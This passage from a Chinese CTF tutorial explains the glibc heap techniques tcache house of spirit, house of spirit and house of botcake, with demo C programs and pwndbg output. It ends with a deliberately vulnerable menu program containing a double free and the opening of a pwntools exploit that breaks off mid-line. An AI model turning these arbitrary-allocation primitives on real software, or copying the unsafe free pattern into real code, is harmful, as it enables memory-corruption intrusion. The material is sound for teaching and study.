<p>然后程序覆写了a的fd指针，将其指向了我们的栈指针</p>
<p>现在栈指针也被链入了我们的free list中</p>
<p>此时我们再malloc，因为不会检查size是否合法，就可以直接将我们的栈指针取出来了(先进后出</p>
<h3 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache_house_of_spirit"></a>tcache_house_of_spirit</h3><p>tcache_house_of_spirit就是通过free一个Fake chunk来让malloc返回一个指向几乎任意地址的指针</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake_chunks[1] 在 %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;fake_chunks[1] 改成 0x40 \n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;把 fake_chunks[2] 的地址赋给 a, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;free 掉 a\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;再去 malloc(0x30)，在可以看到申请来的结果在: %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ojbk\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要点：</p>
<ul>
<li>观察fake_chunks[]数组变化</li>
<li>free(a)，<code>a = &amp;fake_chunks[2];</code>原因：tcache中存放的是chunk_mem_ptr，fake_chunks[0]是prev_size域，fake_chunk[1]是size域</li>
<li>在free(a)后的bins：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x40 [  1]: 0x7fffffffe390 ◂— 0x0</span><br><span class="line">fastbins</span><br></pre></td></tr></table></figure>

<h4 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h4><p>本例就是通过free一个fake chunk来让我们malloc任意地址</p>
<p>程序首先让堆初始化了，然后申请了变量a和fake_chunks</p>
<p>之后程序在fake_chunks中伪造了一个size为0x40的fake_chunk，把a指向fake_chunk的域（也就是Fd指针</p>
<p>现在free a，我们的fake_chunk就被放到了free list中</p>
<p>此时再malloc就可以返回我们的fake chunk了</p>
<h3 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house_of_spirit"></a>house_of_spirit</h3><p>在看完tcache的HOS之后,我们回来看看之前的HOS是什么样的</p>
<p>我们的house of spirit是通过free一个伪造的fastbin chunk来任意地址malloc</p>
<p>让我们来看看和tcache有什么区别吧</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这个例子演示了 house of spirit 攻击\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;我们将构造一个 fake chunk 然后释放掉它，这样再次申请的时候就会申请到它\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;覆盖一个指向 fastbin 的指针\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a, *b;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>] __attribute__ ((aligned (<span class="number">16</span>)));</span><br><span class="line">	<span class="comment">//这个域包含了两个chunk,第一个从fake_chunks[1]开始,另一个从fake_chunks[9]开始</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;这块区域 (长度为: %lu) 包含两个 chunk. 第一个在 %p 第二个在 %p.\n&quot;</span>, <span class="keyword">sizeof</span>(fake_chunks), &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">9</span>]);</span><br><span class="line">	<span class="comment">//这个chunk的size必须符和fastbin的要求(&lt;=128 x64位系统),PREV_INUSE位在fasybin-sized chunks中也是被忽略的,但是IS_MAPPED和NON_MAIN_AREN会引发一些问题</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;构造 fake chunk 的 size，要比 chunk 大 0x10（因为 chunk 头），同时还要保证属于 fastbin，对于 fastbin 来说 prev_inuse 不会改变，但是其他两个位需要注意都要位 0\n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// size</span></span><br><span class="line">	<span class="comment">//下一个fake chunk的size必须是合法的。 即&gt; 2 * SIZE_SZ（在x64上需要&gt; 16）和＆&lt;av-&gt; system_mem（对于main arena来说，默认为&lt;128kb）并且可以通过nextsize完整性检查。 但是我们无需符和Fastbin的大小</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;next chunk 的大小也要注意，要大于 0x10 小于 av-&gt;system_mem（128kb）\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 这是fake_chunks[?]可以数一下</span></span><br><span class="line">    fake_chunks[<span class="number">9</span>] = <span class="number">0x1234</span>; <span class="comment">// nextsize</span></span><br><span class="line">    fake_chunks[<span class="number">2</span>] = <span class="number">0x4141414141414141L</span>L;</span><br><span class="line">    fake_chunks[<span class="number">10</span>] = <span class="number">0x4141414141414141L</span>L;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在，我们拿伪造的那个 fake chunk 的地址进行 free, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;free!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">	<span class="comment">//现在下一次的malloc就将会返回我们的fake chunk了</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;现在 malloc 的时候将会把 %p 给返回回来\n&quot;</span>, &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    b = <span class="built_in">malloc</span>(<span class="number">0x30</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, b);</span><br><span class="line">    b[<span class="number">0</span>] = <span class="number">0x4242424242424242L</span>L;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;ok!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>看完源代码可以发现,我们正常的hos是需要伪造两个chunk的,而tcache则不需要伪造下一个chunk,但是虽然本例中需要伪造两个chunk,但是我们所伪造的第二个chunk是可以不用为fastbin大小的chunk的</p>
<h4 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h4><p>对于没有tcache的glibc版本而言，我们需要连续伪造两块size合法的chunk，并且第二块chunk的size并不需要满足fastbin的要求，只要满足合法的size即可</p>
<p>本程序首先初始话了一下堆,然后申请了两个变量，一个是我们即将攻击的变量 a，另一个是我们的fake_chunks</p>
<p>程序先在fake_chunks[1]的地方也就是size域伪造了合法的size，0x40(满足fastbin size大小，与16字节对齐，标志位正确)</p>
<p>之后又在下一处伪造了第二个chunk，即从fake_chunks[8]开始的地方，这是为什么呢，因为我们第一个fake chunk的size伪造成了0x40，那么我们第二个chunk就需要在向下0x40的地方也就是fake_chunks+8的地方伪造第二个chunk</p>
<h3 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h3><p>本攻击可以bypass glibc 新增加的一些限制,如果libc没有该限制,我们可以直接用double free来做更简单的tcache poisoning了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;house_of_botcake 是针对 glibc2.29 对 tcache double free 做出限制以后提出的利用方法&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;我们希望 malloc 到的地址是 %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;malloc 7 个 chunk 以便稍后填满 tcache&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="type">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): prev=%p. 待会用\n&quot;</span>, prev); </span><br><span class="line">    <span class="type">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;再 malloc(0x100): a=%p. 作为攻击的 chunk\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;最后 malloc(0x10) 防止与 top chunk 合并\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;接下来构造 chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第一步: 填满 tcache 链表&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第二步: free 掉 chunk a，放入 unsorted bin 中&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第三步: 释放掉 chunk prev 因为后面是一个 free chunk，所以他会与 chunk a 合并&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;第四步: 这时候已经没有指向 chunk a 的指针了，从 tcache 中取出一个，然后再次 free(a) 就把 chunk a 加入到了 tcache 中，造成了 double free \n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;再去 malloc 一个 0x120 会从 unsorted bin 中分割出来，也就控制了前面已经合并的那个 chunk a 了&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;把 chunk a 的 next 指针给改为前面声明的 stack_var 的地址&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;再去 malloc 一个就能申请到 stack_var 了&quot;</span>);</span><br><span class="line">    <span class="type">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;新申请的 chunk 在：%p\n&quot;</span>, c);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>分析：</strong></p>
<ul>
<li>从31行开始，这里free了7个chunk是为了填满tcache</li>
<li>再free(a)，使a放入unsortedbin中，再free(prev)，使再unsortedbin中的chunk a和chunk prev合并，实现chunk_overlapping，以至于此时bins中并没有chunk a的信息（chunk a的prev_size在0x555555603ad0）如下：</li>
</ul>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x5555556038c0 —▸ 0x5555556037b0 —▸ 0x5555556036a0 —▸ 0x555555603590 —▸ 0x555555603480 —▸ 0x555555603370 —▸ 0x555555603260 ◂— 0x</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555556039c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555556039c0                      </span><br></pre></td></tr></table></figure>

<ul>
<li>执行了38行的malloc(0x100)，使tcachebins中腾出了一个位置</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  6]: 0x5555556037b0 —▸ 0x5555556036a0 —▸ 0x555555603590 —▸ 0x555555603480 —▸ 0x555555603370 —▸ 0x555555603260 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555556039c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555556039c0</span><br></pre></td></tr></table></figure>

<ul>
<li>执行了39行过后，chunk a就被放入了tcachebins中，这就实现了<strong>double_free</strong>，一个在tcachebins中一个在unsortedbins</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins      <span class="comment">#|这个|#chunk a_mem_ptr</span></span><br><span class="line">0x110 [  7]: 0x555555603ae0 —▸ 0x5555556037b0 —▸ 0x5555556036a0 —▸ 0x555555603590 —▸ 0x555555603480 —▸ 0x555555603370 —▸ 0x555555603260 ◂— 0x0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x5555556039c0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x5555556039c0</span><br></pre></td></tr></table></figure>

<ul>
<li>执行了42行后，修改了chunk a的next指针此时chunk a的情况：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/48gx 0x555555603ad0</span><br><span class="line">0x555555603ad0: 0x0000000000000000      0x0000000000000111</span><br><span class="line">0x555555603ae0: 0x00007fffffffe380      0x0000555555603010</span><br><span class="line">0x555555603af0: 0x0000000000000000      0x00000000000000f1</span><br><span class="line">0x555555603b00: 0x00007ffff7dcdca0      0x00007ffff7dcdca0</span><br><span class="line">0x555555603b10: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>同样bins也发生了变化，此时的bins:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x110 [  7]: 0x555555603ae0 —▸ 0x7fffffffe380 ◂— 9 /* <span class="string">&#x27;\t&#x27;</span> */</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x555555603af0 —▸ 0x7ffff7dcdca0 (main_arena+96) ◂— 0x555555603af0</span><br><span class="line">smallbins</span><br></pre></td></tr></table></figure>

<p>最终，我们在连续申请两个chunk就能得到<code>&amp;stack_var</code>的哪个chunk。</p>
<blockquote>
<p>实战中，我们的stacke_var可以是任意地址</p>
</blockquote>
<h4 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a>总结</h4><p>本例即是通过构造一个chunk_overlapping来辅助我们double free一个tcache chunk，从而得到任意地址分配的效果</p>
<p>首先程序先在栈上声明了一个变量</p>
<p>之后申请了7个大小为0x100的chunks来为后面填满tcache来做准备</p>
<p>然后申请了3个chunk ,prev(0x100),a(0x100)还有用于防止后面我们释放a时a和top chunk合并的一个chunk(0x10)</p>
<p>到此准备工作就结束了；</p>
<p>下面程序free掉了之前我们申请的那7个chunk来填满我们的tcache</p>
<p>之后程序free掉了a，a被放入了unsorted bin中</p>
<p>此时我们在free prev，由于a,prev相邻，因此二者合并成了一个大chunk，同样被放进了unsorted bin中</p>
<p>此时free list上就没有了a的信息</p>
<p>现在程序从tcache中取出一个chunk,tcache中就有了一个空位，我们再次free a,就会把我们的a放到tcache中了</p>
<p>此时，我们的a既在tcache中，又在unsortedbin的大chunk中</p>
<p>也就是完成了一个double free</p>
<p>之后程序malloc了b(0x120),由于unsortedbin中的chunk大小大于0x120,因此做了一个切割，并把剩下的部分留在unsorted bin中</p>
<p>此时的b是从之前prev的位置开始的，因此我们通过覆写b来将我们a的fwd指针指向栈上</p>
<p>此时，我们再申请两次就可以分配到栈上的地址了</p>
<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="tcache-corruption-dup-—-libc-2-27"><a href="#tcache-corruption-dup-—-libc-2-27" class="headerlink" title="tcache_corruption+dup — libc 2.27"></a>tcache_corruption+dup — libc 2.27</h3><p><a href="https://faraz.faith/2019-10-20-secconctf-2019-one/">one</a></p>
<h3 id="tcache-corruption-—-libc-2-29"><a href="#tcache-corruption-—-libc-2-29" class="headerlink" title="tcache_corruption — libc 2.29"></a>tcache_corruption — libc 2.29</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LENGTH 22</span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* nodes[LENGTH];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">inital</span><span class="params">()</span> &#123;</span><br><span class="line">	setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">	alarm(<span class="number">0xffff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;Tcache Corruption - Two&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;1. add&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;2. delete&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;3. show&quot;</span>);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;4. exit&quot;</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_n</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> size)</span> &#123;</span><br><span class="line">	<span class="type">int</span> result;</span><br><span class="line">	result = read(STDIN_FILENO, buf, size);</span><br><span class="line">	<span class="keyword">if</span> (result &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">get_int</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">	<span class="type">int</span> result;</span><br><span class="line">	result = read_n(buf, <span class="keyword">sizeof</span>(buf) - <span class="number">1</span>);</span><br><span class="line">	buf[result] = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">return</span> atoi(buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> size, index = <span class="number">-1</span>, i, result;</span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; LENGTH; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (!nodes[i]) &#123;</span><br><span class="line">			index = i;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (index == <span class="number">-1</span>) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Out of space!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">	size = get_int();</span><br><span class="line">	<span class="keyword">if</span> (size &gt; <span class="number">0x400</span>) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Invalid size!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	nodes[index] = <span class="built_in">malloc</span>(size);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">	result = read_n(nodes[index], size);</span><br><span class="line">	<span class="keyword">if</span> (nodes[index][result - <span class="number">1</span>] == <span class="string">&#x27;\n&#x27;</span>)&#123;</span><br><span class="line">		nodes[index][result - <span class="number">1</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> index = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">	index = get_int();</span><br><span class="line">	<span class="keyword">if</span> (index &gt;= LENGTH || !nodes[index]) &#123;</span><br><span class="line">		<span class="built_in">puts</span>(<span class="string">&quot;Invalid index!&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(nodes[index]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">show</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; LENGTH; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> (nodes[i]) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Index %d: %s\n&quot;</span>, i, nodes[i]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	inital();</span><br><span class="line">	welcome();</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		menu();</span><br><span class="line">		<span class="type">unsigned</span> <span class="type">int</span> choice = get_int();</span><br><span class="line">		<span class="keyword">switch</span> (choice) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">			add();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">			delete();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">			show();</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="built_in">puts</span>(<span class="string">&quot;Invalid choice!&quot;</span>);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc -o pwn1 pwn1.c  glibc-2.29 ubuntu18.04</span></span><br></pre></td></tr></table></figure>



<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;&#x27;</span>, )</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.23.so&#x27;)</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = 